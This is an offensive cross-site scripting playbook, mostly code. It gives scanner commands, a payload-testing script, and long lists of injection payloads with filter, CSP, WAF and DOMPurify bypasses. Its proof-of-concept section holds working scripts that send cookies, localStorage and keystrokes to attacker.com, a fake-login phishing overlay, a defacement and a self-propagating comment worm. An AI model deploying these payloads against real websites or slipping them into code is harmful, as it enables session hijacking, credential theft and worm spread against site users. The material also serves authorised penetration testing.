# Cross-Site Scripting (XSS) Playbook

## Indicators

Signs this vulnerability may be present:
- User input reflected in HTML responses without encoding
- Input appears in JavaScript code blocks or event handlers
- URL parameters rendered directly in page content
- Search functionality displaying search terms
- Error messages echoing user input
- User-controlled data stored and displayed to other users (comments, profiles)
- Rich text editors or WYSIWYG inputs
- DOM manipulation based on URL fragments or query parameters

## Tools

### Dalfox

```bash
# Basic URL scan
dalfox url "http://target.com/search?q=test"

# Scan with custom payload
dalfox url "http://target.com/search?q=test" --custom-payload payloads.txt

# Pipe URLs from file
cat urls.txt | dalfox pipe

# Scan with authentication
dalfox url "http://target.com/search?q=test" --cookie "session=abc123"

# With custom headers
dalfox url "http://target.com/search?q=test" --header "Authorization: Bearer token"

# Increase worker threads for speed
dalfox url "http://target.com/search?q=test" -w 50

# Output to file
dalfox url "http://target.com/search?q=test" -o results.txt

# Blind XSS with callback
dalfox url "http://target.com/search?q=test" --blind "https://attacker.xss.ht"

# Skip specific checks
dalfox url "http://target.com/search?q=test" --skip-bav

# Follow redirects
dalfox url "http://target.com/search?q=test" --follow-redirects

# Mining parameters from page
dalfox url "http://target.com/" --mining-dict

# Scan with POST data
dalfox url "http://target.com/form" --data "name=test&email=test@test.com" --method POST
```

### Manual Testing

```bash
# Basic reflection test
curl "http://target.com/search?q=<script>alert(1)</script>"
curl "http://target.com/search?q=\"><script>alert(1)</script>"

# Test in different contexts
curl "http://target.com/page?name=<img src=x onerror=alert(1)>"
curl "http://target.com/page?callback=alert(1)//"

# Event handler injection
curl "http://target.com/search?q=\"onmouseover=\"alert(1)"
curl "http://target.com/search?q='onfocus='alert(1)'autofocus'"

# SVG-based XSS
curl "http://target.com/upload" -F "file=@payload.svg"

# POST-based XSS
curl -X POST "http://target.com/comment" \
     -d "body=<script>alert(document.cookie)</script>"

# JSON response XSS
curl "http://target.com/api/user?callback=alert(1)//"

# Testing DOM XSS via URL fragment
# (Manual browser testing required for fragment-based DOM XSS)
# http://target.com/page#<img src=x onerror=alert(1)>
```

### Python Script for XSS Hunting

```python
#!/usr/bin/env python3
import requests
import sys
from urllib.parse import urlencode, quote

payloads = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    '<svg onload=alert(1)>',
    '{{constructor.constructor("alert(1)")()}}',
]

def test_xss(url, param):
    for payload in payloads:
        test_url = f"{url}?{param}={quote(payload)}"
        try:
            response = requests.get(test_url, timeout=10)
            if payload in response.text:
                print(f"[+] Potential XSS: {test_url}")
                print(f"    Payload reflected: {payload}")
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    test_xss("http://target.com/search", "q")
```

## Techniques

### 1. Reflected XSS

Payload is immediately reflected in the response.

```html
<!-- Basic script injection -->
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

<!-- Breaking out of attributes -->
"><script>alert(1)</script>
'><script>alert(1)</script>
" onfocus=alert(1) autofocus="
' onfocus=alert(1) autofocus='

<!-- Breaking out of JavaScript strings -->
';alert(1)//
";alert(1)//
</script><script>alert(1)</script>

<!-- HTML context -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

### 2. Stored XSS

Payload is stored and rendered to other users.

```html
<!-- Comment/forum injection -->
<script>alert('Stored XSS')</script>

<!-- Profile field injection -->
Username: <img src=x onerror=alert(1)>
Bio: <svg/onload=alert(document.cookie)>

<!-- File name injection -->
filename: "><img src=x onerror=alert(1)>.jpg

<!-- Metadata injection (EXIF, etc.) -->
<!-- Use exiftool to inject into image metadata -->
exiftool -Artist='<script>alert(1)</script>' image.jpg
```

### 3. DOM-Based XSS

Payload is processed by client-side JavaScript.

```javascript
// Vulnerable sinks to look for:
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
eval()
setTimeout()
setInterval()
Function()
location.href
location.assign()
location.replace()

// Common vulnerable patterns:
// URL fragment injection
var hash = location.hash.slice(1);
document.getElementById('output').innerHTML = hash;
// Payload: http://target.com/page#<img src=x onerror=alert(1)>

// Query parameter injection
var search = new URLSearchParams(location.search);
document.write(search.get('name'));
// Payload: http://target.com/page?name=<script>alert(1)</script>

// postMessage vulnerability
window.addEventListener('message', function(e) {
    document.getElementById('output').innerHTML = e.data;
});
// Exploit from attacker page:
// targetWindow.postMessage('<img src=x onerror=alert(1)>', '*');

// jQuery vulnerabilities
$(location.hash);  // jQuery < 1.9
$('#' + $.param.fragment());
// Payload: http://target.com/page#<img src=x onerror=alert(1)>
```

### 4. mXSS (Mutation XSS)

Exploits browser HTML parsing/serialization differences.

```html
<!-- mXSS via innerHTML normalization -->
<noscript><p title="</noscript><script>alert(1)</script>">

<!-- mXSS via namespace confusion -->
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>

<!-- mXSS via SVG foreignObject -->
<svg><foreignObject><iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">

<!-- mXSS via template elements -->
<template><style></template><img src=x onerror=alert(1)>

<!-- DOMPurify bypass examples (version dependent) -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>-->
```

## Context-Specific Payloads

### HTML Context

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<a href="javascript:alert(1)">click</a>
<form action="javascript:alert(1)"><input type=submit>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<math><a xlink:href="javascript:alert(1)">click
```

### Attribute Context

```html
<!-- Breaking out of attribute value -->
" onmouseover="alert(1)
' onmouseover='alert(1)
" onfocus="alert(1)" autofocus="
" onclick="alert(1)

<!-- Event handlers without quotes -->
"onmouseover=alert(1)//
'onmouseover=alert(1)//

<!-- Within href/src attributes -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### JavaScript Context

```javascript
// Breaking out of strings
';alert(1)//
";alert(1)//
\';alert(1)//
\";alert(1)//

// Breaking out of template literals
${alert(1)}
`+alert(1)+`

// Within JavaScript comments
*/alert(1)/*

// Encoded payloads
\u0061lert(1)
\x61lert(1)

// Function context
)-alert(1)-(
]-alert(1)-[
}-alert(1)-{
```

### URL Context

```
javascript:alert(1)
javascript://comment%0aalert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

## Bypass Techniques

### HTML Entity Bypass

```html
<!-- Numeric entities -->
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;

<!-- Named entities (partial) -->
&lt;script&gt; (usually blocked)

<!-- Null bytes -->
<scr%00ipt>alert(1)</scr%00ipt>

<!-- Mixed encoding -->
<scr&#x69;pt>alert(1)</scr&#x69;pt>
```

### JavaScript Escape Bypass

```javascript
// Unicode escapes
\u0061\u006c\u0065\u0072\u0074(1)

// Hex escapes
\x61\x6c\x65\x72\x74(1)

// Octal escapes (non-strict mode)
\141\154\145\162\164(1)

// Template literal bypass
alert`1`

// Constructor bypass
[].constructor.constructor('alert(1)')()
''.constructor.constructor('alert(1)')()

// Indirect eval
[]['filter']['constructor']('alert(1)')()
window['eval']('alert(1)')
this['alert'](1)
self['alert'](1)
parent['alert'](1)
top['alert'](1)
```

### CSP Bypass

```html
<!-- Via JSONP endpoints -->
<script src="https://trusted.com/api?callback=alert(1)//"></script>

<!-- Via Angular (if angular.js is allowed) -->
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>

<!-- Via base tag hijacking -->
<base href="https://attacker.com/">
<script src="/malicious.js"></script>

<!-- Via data: URI (if allowed) -->
<script src="data:text/javascript,alert(1)"></script>

<!-- Via blob: URI -->
<script>
var blob = new Blob(['alert(1)'], {type: 'text/javascript'});
var url = URL.createObjectURL(blob);
var script = document.createElement('script');
script.src = url;
document.body.appendChild(script);
</script>

<!-- Via object/embed with PDF -->
<object data="https://attacker.com/xss.pdf">

<!-- Via meta refresh -->
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">

<!-- Via SVG -->
<svg><use href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x">

<!-- Nonce stealing via dangling markup -->
<img src="https://attacker.com/log?
```

### WAF Evasion

```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>

<!-- Tag variations -->
<script/x>alert(1)</script>
<script	>alert(1)</script>
<script
>alert(1)</script>
<script>/**/alert(1)</script>

<!-- Event handler variations -->
<img src=x onerror    =alert(1)>
<img src=x onerror=alert(1)>

<!-- Encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=\u0061lert(1)>

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Alternative functions -->
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=print()>

<!-- Without parentheses -->
<img src=x onerror=alert`1`>
<svg onload=alert&lpar;1&rpar;>

<!-- Without alert keyword -->
<img src=x onerror=[].constructor.constructor('return alert(1)')()()>
```

## Proof-of-Concept Payloads

### Cookie Stealing

```html
<script>
fetch('https://attacker.com/steal?c='+document.cookie);
</script>

<script>
new Image().src='https://attacker.com/steal?c='+document.cookie;
</script>

<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">

<!-- Via redirect -->
<script>
location='https://attacker.com/steal?c='+document.cookie;
</script>
```

### Session Hijacking

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://attacker.com/hijack?session='+document.cookie, true);
xhr.send();
</script>

<!-- Capturing entire localStorage -->
<script>
var data = JSON.stringify(localStorage);
fetch('https://attacker.com/steal', {method:'POST', body:data});
</script>
```

### Keylogging

```html
<script>
document.onkeypress = function(e) {
    fetch('https://attacker.com/keys?k='+e.key);
}
</script>

<!-- Comprehensive keylogger -->
<script>
var keys = '';
document.onkeypress = function(e) {
    keys += e.key;
    if(keys.length > 20) {
        fetch('https://attacker.com/log', {method:'POST', body:keys});
        keys = '';
    }
}
</script>
```

### Phishing/Credential Theft

```html
<script>
document.body.innerHTML = '<form action="https://attacker.com/phish" method="POST">' +
    '<h2>Session Expired - Please Login</h2>' +
    '<input name="user" placeholder="Username"><br>' +
    '<input name="pass" type="password" placeholder="Password"><br>' +
    '<input type="submit" value="Login">' +
    '</form>';
</script>
```

### Defacement

```html
<script>
document.body.innerHTML = '<h1>Hacked by XSS</h1>';
</script>
```

### Worm Propagation

```html
<!-- Self-propagating XSS worm -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', '/api/comment', true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({
    content: '<script src="https://attacker.com/worm.js"><\/script>'
}));
</script>
```

## Success Indicators

- Alert/confirm/prompt dialog boxes appear in browser
- Payload appears unencoded in page source
- JavaScript code executes (visible in browser console)
- Cookies received at attacker-controlled server
- DOM manipulation succeeds (page content changes)
- Event handlers trigger on user interaction
- Data exfiltration confirmed via out-of-band channel
- Browser developer tools show script execution
- Application stores and renders payload to other users (stored XSS)
- URL fragment/parameter processed by client-side JavaScript (DOM XSS)
